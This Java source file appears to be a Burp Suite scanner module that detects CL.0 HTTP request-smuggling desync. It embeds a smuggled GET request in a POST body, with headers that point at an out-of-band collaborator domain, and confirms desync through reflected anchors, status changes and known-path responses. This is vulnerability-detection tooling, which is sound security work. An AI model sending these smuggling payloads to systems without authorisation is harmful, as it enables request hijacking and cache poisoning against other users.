package burp;
import org.apache.commons.lang3.tuple.ImmutablePair;
import org.apache.commons.lang3.tuple.Pair;

import java.util.ArrayList;
import java.util.List;

public class ImplicitZeroScan extends Scan {
    ImplicitZeroScan(String name) {
        super(name);
    }

    @Override
    List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        Utilities.supportsHTTP2 = true;
        byte[] req = Utilities.setMethod(baseReq, "POST");
        if (Utilities.isHTTP2(req)) {
            req = Utilities.replaceFirst(req, " HTTP/2\r\n", " HTTP/1.1\r\n");
        }

        String targetPath = "/robots.txt";
        String baseCanary = "cj83kz9z";
        req = Utilities.appendToQuery(req, baseCanary);
        //req = Utilities.setPath(req, targetPath);
        req = Utilities.addOrReplaceHeader(req, "Content-Type", "application/x-www-form-urlencoded");
        req = Utilities.addOrReplaceHeader(req, "Connection", "keep-alive");
        String leftAnchor = "xyzaaa";
        String rightAnchor = "bbbrlv";
        String basePath = "/"+leftAnchor+"!"+rightAnchor+"?query="+leftAnchor+"!"+rightAnchor;

        String target = service.getHost().replaceAll("[.]", "-") + ".z115tud61jj185qizgq6guzkobu1iq.psres.net";
        String smuggle = String.format(
                "GET "+basePath+" HTTP/1.1\r\n" +
                        "Referer: http://ref.%s/\r\n" +
                        "X-Forwarded-For: xff.%s\r\n" +
                        "Dud: dud.%s\r\n" +
                        "True-Client-IP: tci.%s\r\n" +
                        "Aa: bb", target, target, target, target);

        req = Utilities.setBody(req, smuggle);
        req = Utilities.addOrReplaceHeader(req, "Content-Length", ""+smuggle.length());

        //req = Utilities.replaceFirst(req, "Content-Length: ", "Content-Length: +");
        //req = Utilities.replaceFirst(req, "Content-Length: ", "Content-Length: 0");
        //req = Utilities.replaceFirst(req, "Content-Length:", "Content-Length :");
        //req = Utilities.replaceFirst(req, "Content-Length:", "Foo x: x\r\nContent-Length:");
        //req = Utilities.replaceFirst(req, "Content-Length:", "Foo: x\nContent-Length:");

        Resp baseResp = null;
        Resp lastResp = null;
        int code = 0;
        boolean codeChangeDetected = false;

        // do not set i over 9
        for (int i=0; i<9; i++) {

            byte[] attack = Utilities.setBody(req, smuggle.replace("!", String.valueOf(i)));
            Resp resp = request(service, attack);
            if (resp.failed()) {
                return null;
            }

            byte[] data = resp.getReq().getResponse();
            int start = Utilities.helpers.indexOf(data, leftAnchor.getBytes(), false, 0, data.length);
            if (start != -1) {
                byte x = data[start+leftAnchor.length()];
                int reflectionID = Integer.parseInt(Character.toString((char)x));
                if (reflectionID < i) {
                    report("CL.0 desync: reflection", "", baseReq, resp);
                    return null;
                }
            }

            if (resp.getStatus() != code && code != 0) {
                if (Utilities.contains(resp, leftAnchor+i) || Utilities.contains(resp, baseCanary)) {
                    return null;
                }
                codeChangeDetected = true;
                lastResp = resp;
                break;
            }
            code = resp.getStatus();
            baseResp = resp;
        }

        if (!codeChangeDetected) {
            return null;
        }

        Utils.out("Fingerprinting 404 code badly");
        byte[] get404 = Utilities.setPath(baseReq, basePath.replace("!", "0"));
        get404 = Utilities.setMethod(get404, "GET");
        Resp notFound = request(service, get404);
        int notFoundCode = notFound.getStatus();
        if (notFoundCode != lastResp.getStatus()) {
            return null;
        }

        Utils.out("Trying known-response followup");
        if (knownResponse(service, req, baseReq, baseResp, lastResp, basePath)) {
            return null;
        }
//
//        req = Utilities.replaceFirst(req, "Content-Length", "x");
//        req = Utilities.setBody(req, "");
//        for (int i=0; i<10; i++) {
//            Resp resp = request(service, req);
//            if (resp.getStatus() == notFound.getStatus()) {
//                return null;
//            }
//        }
//
//        report("CL.0 desync: 404-code", "", baseReq, baseResp, lastResp, notFound);

        return null;
    }

    boolean knownResponse(IHttpService service, byte[] req, byte[] baseReq, Resp baseResp, Resp lastResp, String basePath) {

        ArrayList<Pair<String, String>> mappings = new ArrayList<>();
        mappings.add(new ImmutablePair<>("/robots.txt", "Disallow:"));
        mappings.add(new ImmutablePair<>("/favicon.ico", "Content-Type: image/"));
        mappings.add(new ImmutablePair<>("/sitemap.xml", "Content-Type: application/xml"));
        mappings.add(new ImmutablePair<>("/../", "400 Bad Request"));

        for (Pair<String, String> known: mappings) {
            String knownPath = known.getLeft();
            String knownContent = known.getRight();
            if (knownPath.equals(basePath)) {
                continue;
            }

            if (Utilities.contains(baseResp, knownContent) || Utilities.contains(lastResp, knownContent) ) {
                continue;
            }

            for (int i=0; i<16; i++) {

                byte[] attack = Utilities.replaceFirst(req, basePath, knownPath+("a".repeat(basePath.length()-knownPath.length())));
                Resp resp = request(service, attack);
                if (resp.failed()) {
                    return false;
                }

                if (Utilities.contains(resp, knownContent)) {
                    report("CL.0 desync: known-response", "", baseReq, baseResp, lastResp, resp);
                    return true;
                }
            }
        }

        return false;
    }
}


